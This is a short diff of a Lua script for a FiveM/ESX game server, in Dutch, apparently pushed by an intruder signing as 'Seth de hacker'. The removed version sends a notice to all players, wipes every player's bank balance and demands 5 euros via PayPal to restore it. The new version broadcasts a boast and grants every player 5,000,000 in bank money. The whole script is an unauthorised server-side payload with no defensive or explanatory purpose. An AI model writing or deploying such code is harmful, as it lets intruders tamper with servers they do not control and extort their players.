@@ -1,9 +1,9 @@
-TriggerClientEvent('esx:showNotification',-1, "Hacken is niet cool blijkbaar")
+TriggerClientEvent('esx:showNotification',-1, "Ben ik weer")
 local playerList = ESX.GetPlayers()
 for i=1, #playerList, 1 do
     local _source = playerList[i]
     local xPlayer = ESX.GetPlayerFromId(_source)
-    xPlayer.showNotification("Ik moest van de admins het geld verwijderen :(")
-    xPlayer.showNotification("Voor 5 euro paypal geef ik je het geld terug")
-    xPlayer.setAccountMoney("bank", 0)
+    xPlayer.showNotification("5mil ban jullie favoriete hacker")
+    xPlayer.showNotification("Vriendelijke groetjes van Seth de hacker")
+    xPlayer.addAccountMoney("bank", 5000000)
 end
